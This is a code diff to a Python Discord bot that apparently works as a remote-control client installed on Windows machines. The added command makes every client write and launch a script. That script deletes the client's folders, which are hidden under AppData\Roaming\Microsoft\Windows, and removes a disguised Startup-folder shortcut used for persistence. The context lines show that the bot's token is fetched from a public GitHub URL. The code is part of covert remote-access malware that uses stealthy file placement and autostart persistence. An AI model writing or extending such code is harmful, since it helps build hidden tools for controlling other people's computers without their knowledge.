@@ -274,7 +274,40 @@ sys.exit(0)
             file.write(script_content)
         subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
         sys.exit(0)
-        
+
+@client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
+async def self_destruct_all(interaction : Interaction):
+    user_id = interaction.user.id
+    await interaction.response.send_message("Self-destructing all clients...")
+    await interaction.edit_original_message(content="Clients most likely self destructed!")
+    script_content = """
+import shutil
+import os
+from pathlib import Path
+import time
+import sys
+
+time.sleep(1)
+
+user_profile = os.environ['USERPROFILE']
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
+shutil.rmtree(os.path.join(target_path, "skibidi-mainmain"))
+startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+shortcut_name="MyPythonScript"
+shortcut_path = startup_dir / f"{shortcut_name}.lnk"
+os.remove(shortcut_path)
+sys.exit(0)
+"""
+
+    script_file = "self-destruct.py"
+    user_profile = os.environ['USERPROFILE']
+    target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+    with open(os.path.join(target_path, script_file), "w") as file:
+        file.write(script_content)
+    subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
+    sys.exit(0)
+    
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
